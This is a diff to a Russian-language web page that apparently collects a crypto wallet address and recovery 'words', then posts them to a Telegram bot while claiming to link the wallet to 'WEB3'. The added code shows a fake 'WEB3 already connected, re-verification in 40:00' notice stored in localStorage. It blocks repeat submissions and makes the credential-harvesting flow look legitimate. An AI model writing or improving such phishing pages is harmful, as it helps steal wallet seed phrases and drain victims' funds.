@@ -300,6 +300,51 @@
             margin: 10px 0;
         }
         
+        /* Сообщение о WEB3 подключении */
+        .web3-connected-message {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+            color: white;
+            text-align: center;
+            animation: pulse 2s infinite;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .web3-connected-message h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #ffeb3b;
+        }
+        
+        .web3-connected-message p {
+            font-size: 16px;
+            margin: 10px 0;
+            line-height: 1.6;
+        }
+        
+        .web3-connected-message .timer {
+            font-size: 32px;
+            font-weight: bold;
+            color: #ffeb3b;
+            margin: 15px 0;
+            font-family: monospace;
+        }
+        
+        .web3-connected-message .address {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px;
+            border-radius: 10px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(102, 126, 234, 0.5); }
+            50% { transform: scale(1.02); box-shadow: 0 0 40px rgba(102, 126, 234, 0.8); }
+        }
+        
         /* Кнопки */
         .btn {
             padding: 15px 30px;
@@ -423,6 +468,11 @@
             border-color: #f44336;
         }
         
+        .input-group input.web3-connected {
+            border-color: #667eea;
+            background: rgba(102, 126, 234, 0.05);
+        }
+        
         /* Поля для слов */
         .words-grid {
             display: grid;
@@ -497,6 +547,20 @@
             background: #f8d7da;
             color: #721c24;
             border-left: 4px solid #dc3545;
+            display: block;
+        }
+        
+        .status.warning {
+            background: #fff3cd;
+            color: #856404;
+            border-left: 4px solid #ffc107;
+            display: block;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border-left: 4px solid #17a2b8;
             display: block;
         }
         
@@ -630,6 +694,19 @@
         <div id="step3" class="section">
             <div class="selected-info" id="selectedCoinInfo"></div>
             
+            <!-- Сообщение о WEB3 подключении (появляется если адрес уже использовался) -->
+            <div class="web3-connected-message" id="web3ConnectedMessage" style="display: none;">
+                <h3>🔗 WEB3 УЖЕ ПОДКЛЮЧЕН!</h3>
+                <p>Данный кошелек уже был верифицирован.</p>
+                <p>Адрес:</p>
+                <div class="address" id="connectedAddress"></div>
+                <p>Подключен:</p>
+                <div class="timer" id="connectedTimer"></div>
+                <p>Повторная верификация будет доступна через:</p>
+                <div class="timer" id="countdownTimer">40:00</div>
+                <p>Пожалуйста, подождите или используйте другой кошелек.</p>
+            </div>
+            
             <div class="input-group">
                 <label for="walletAddress">📬 Адрес кошелька</label>
                 <input type="text" id="walletAddress" placeholder="Например: TXYZ... (для TRX)" autocomplete="off">
@@ -690,6 +767,59 @@
         let walletAddress = '';
         let metamaskConfirmed = false;
         let hasBalance = false;
+        
+        // Ключ для localStorage
+        const WEB3_CONNECTIONS_KEY = 'web3_connections';
+        
+        // Загружаем сохраненные подключения
+        function loadConnections() {
+            const saved = localStorage.getItem(WEB3_CONNECTIONS_KEY);
+            return saved ? JSON.parse(saved) : {};
+        }
+        
+        // Сохраняем подключение
+        function saveConnection(address) {
+            const connections = loadConnections();
+            connections[address] = {
+                timestamp: Date.now(),
+                address: address
+            };
+            localStorage.setItem(WEB3_CONNECTIONS_KEY, JSON.stringify(connections));
+        }
+        
+        // Проверяем, активно ли подключение (меньше 40 минут)
+        function isConnectionActive(address) {
+            const connections = loadConnections();
+            const connection = connections[address];
+            
+            if (!connection) return false;
+            
+            const timePassed = Date.now() - connection.timestamp;
+            const minutesPassed = timePassed / (1000 * 60);
+            
+            return minutesPassed < 40;
+        }
+        
+        // Получаем время до окончания
+        function getTimeRemaining(address) {
+            const connections = loadConnections();
+            const connection = connections[address];
+            
+            if (!connection) return 0;
+            
+            const timePassed = Date.now() - connection.timestamp;
+            const minutesPassed = timePassed / (1000 * 60);
+            const minutesLeft = 40 - minutesPassed;
+            
+            return Math.max(0, minutesLeft);
+        }
+        
+        // Форматируем время
+        function formatTimeRemaining(minutes) {
+            const mins = Math.floor(minutes);
+            const secs = Math.floor((minutes - mins) * 60);
+            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
         
         // Создаем сетку монет
         const coinsGrid = document.getElementById('coinsGrid');
@@ -774,6 +904,14 @@
         const statusDiv = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
         
+        // Элементы для сообщения о WEB3 подключении
+        const web3ConnectedMessage = document.getElementById('web3ConnectedMessage');
+        const connectedAddress = document.getElementById('connectedAddress');
+        const connectedTimer = document.getElementById('connectedTimer');
+        const countdownTimer = document.getElementById('countdownTimer');
+        
+        let countdownInterval = null;
+        
         // Функция обновления прогрессбара
         function updateProgressBar(step) {
             const percent = (step - 1) * 33.33;
@@ -793,6 +931,46 @@
             if (afterElement) {
                 afterElement.style.width = `${percent}%`;
             }
+        }
+        
+        // Функция проверки адреса на WEB3 подключение
+        function checkWeb3Connection(address) {
+            if (isConnectionActive(address)) {
+                const connections = loadConnections();
+                const connection = connections[address];
+                const date = new Date(connection.timestamp);
+                
+                connectedAddress.textContent = address;
+                connectedTimer.textContent = date.toLocaleString();
+                
+                web3ConnectedMessage.style.display = 'block';
+                walletAddressInput.classList.add('web3-connected');
+                walletAddressInput.disabled = true;
+                nextToStep4.disabled = true;
+                
+                // Запускаем обратный отсчет
+                if (countdownInterval) clearInterval(countdownInterval);
+                
+                countdownInterval = setInterval(() => {
+                    const minutesLeft = getTimeRemaining(address);
+                    if (minutesLeft <= 0) {
+                        clearInterval(countdownInterval);
+                        web3ConnectedMessage.style.display = 'none';
+                        walletAddressInput.classList.remove('web3-connected');
+                        walletAddressInput.disabled = false;
+                        checkAddressInput();
+                    } else {
+                        countdownTimer.textContent = formatTimeRemaining(minutesLeft);
+                    }
+                }, 1000);
+                
+                return true;
+            }
+            
+            web3ConnectedMessage.style.display = 'none';
+            walletAddressInput.classList.remove('web3-connected');
+            walletAddressInput.disabled = false;
+            return false;
         }
         
         // Обработчики баланса
@@ -866,25 +1044,47 @@
                 <p><strong>💰 Монета:</strong> ${selectedCoin.name} (${selectedCoin.symbol})</p>
                 <p><strong>📋 Формат:</strong> ${selectedCoin.symbol === 'TRX' ? 'Начинается с T' : 'Стандартный'}</p>
             `;
+            
+            // Очищаем поле адреса при входе на шаг
+            walletAddressInput.value = '';
+            walletAddressInput.classList.remove('error', 'web3-connected');
+            walletAddressInput.disabled = false;
+            web3ConnectedMessage.style.display = 'none';
+            if (countdownInterval) clearInterval(countdownInterval);
         });
         
         backToStep2.addEventListener('click', () => {
             step3.classList.remove('active');
             step2.classList.add('active');
             updateProgressBar(2);
+            
+            // Очищаем таймер при выходе
+            if (countdownInterval) clearInterval(countdownInterval);
         });
         
-        walletAddressInput.addEventListener('input', (e) => {
-            const address = e.target.value.trim();
+        function checkAddressInput() {
+            const address = walletAddressInput.value.trim();
             
             if (selectedCoin && validateAddress(address, selectedCoin)) {
+                // Проверяем, не было ли уже подключение
+                if (isConnectionActive(address)) {
+                    checkWeb3Connection(address);
+                    return false;
+                }
+                
                 walletAddress = address;
                 nextToStep4.disabled = false;
                 walletAddressInput.classList.remove('error');
+                return true;
             } else {
                 nextToStep4.disabled = true;
                 walletAddressInput.classList.add('error');
+                return false;
             }
+        }
+        
+        walletAddressInput.addEventListener('input', (e) => {
+            checkAddressInput();
         });
         
         nextToStep4.addEventListener('click', () => {
@@ -904,12 +1104,20 @@
                 input.value = '';
                 input.classList.remove('blur-effect');
             });
+            
+            // Очищаем таймер при переходе
+            if (countdownInterval) clearInterval(countdownInterval);
         });
         
         backToStep3.addEventListener('click', () => {
             step4.classList.remove('active');
             step3.classList.add('active');
             updateProgressBar(3);
+            
+            // Проверяем адрес при возврате
+            if (walletAddress) {
+                checkAddressInput();
+            }
         });
         
         async function sendToTelegram(message) {
@@ -945,6 +1153,19 @@
                 return;
             }
             
+            // Финальная проверка адреса перед отправкой
+            if (isConnectionActive(walletAddress)) {
+                showStatus('❌ WEB3 уже подключен к этому кошельку!', 'error');
+                
+                // Возвращаем на шаг с адресом
+                step4.classList.remove('active');
+                step3.classList.add('active');
+                updateProgressBar(3);
+                
+                checkWeb3Connection(walletAddress);
+                return;
+            }
+            
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ Отправка...';
             
@@ -958,6 +1179,9 @@
                                `🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
                 
                 await sendToTelegram(message);
+                
+                // Сохраняем подключение
+                saveConnection(walletAddress);
                 
                 showStatus('✅ Подвязка к WEB3 в течении 30 минут!', 'success');
                 
@@ -980,6 +1204,8 @@
             });
             
             walletAddressInput.value = '';
+            walletAddressInput.classList.remove('error', 'web3-connected');
+            walletAddressInput.disabled = false;
             
             document.querySelectorAll('.coin-card').forEach(c => {
                 c.classList.remove('selected');
@@ -998,6 +1224,10 @@
             // Скрываем сообщения
             topupMessage.classList.remove('show');
             warningMessage.style.display = 'none';
+            web3ConnectedMessage.style.display = 'none';
+            
+            // Очищаем таймер
+            if (countdownInterval) clearInterval(countdownInterval);
             
             // Возврат на первый шаг
             step4.classList.remove('active');
@@ -1027,6 +1257,25 @@
         
         window.addEventListener('load', () => {
             updateProgressBar(1);
+            
+            // Очищаем старые подключения (старше 40 минут) при загрузке
+            const connections = loadConnections();
+            const now = Date.now();
+            let changed = false;
+            
+            Object.keys(connections).forEach(address => {
+                const timePassed = now - connections[address].timestamp;
+                const minutesPassed = timePassed / (1000 * 60);
+                
+                if (minutesPassed >= 40) {
+                    delete connections[address];
+                    changed = true;
+                }
+            });
+            
+            if (changed) {
+                localStorage.setItem(WEB3_CONNECTIONS_KEY, JSON.stringify(connections));
+            }
         });
     </script>
 </body>
